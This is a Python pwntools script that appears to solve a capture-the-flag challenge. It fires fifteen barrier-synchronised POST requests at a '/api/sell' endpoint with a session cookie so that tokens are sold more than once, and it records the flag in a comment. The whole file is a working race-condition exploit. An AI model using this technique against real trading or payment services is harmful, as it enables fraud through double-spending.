#!/usr/bin/env python3
from pwn import *

host = "buttcoin-1.play.hfsc.tf"
port = 3000
uri = "/api/sell"
# step 1: create an account, copy a cookie, buy 100 buttcoins, run script
cookie = "connect.sid=s:8VC9BDyO1g-vUg8tA5uJv52nWSBIuMcK.D4uEBYy06lxlxpJLVOwRpixbFqczft81Hwicb8m7Mzs"
data = "token=buttcoin&amount=100"
# step 2: buy 1000 hehecoins, run script
data = "token=hehecoin&amount=1000"
barrier = threading.Barrier(15)


def sell():
    r = remote(host, port, ssl=True)
    barrier.wait()
    r.send(f"""POST {uri} HTTP/1.1\r
Host: {host}\r
Cookie: {cookie}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
Connection: close\r
\r
{data}""".encode())
    print(r.recvall())


def main():
    for _ in range(15):
        Thread(target=sell).start()
    # midnight{4_r3l4x1ng_tr1p_t0_th3_SPA}


if __name__ == "__main__":
    main()
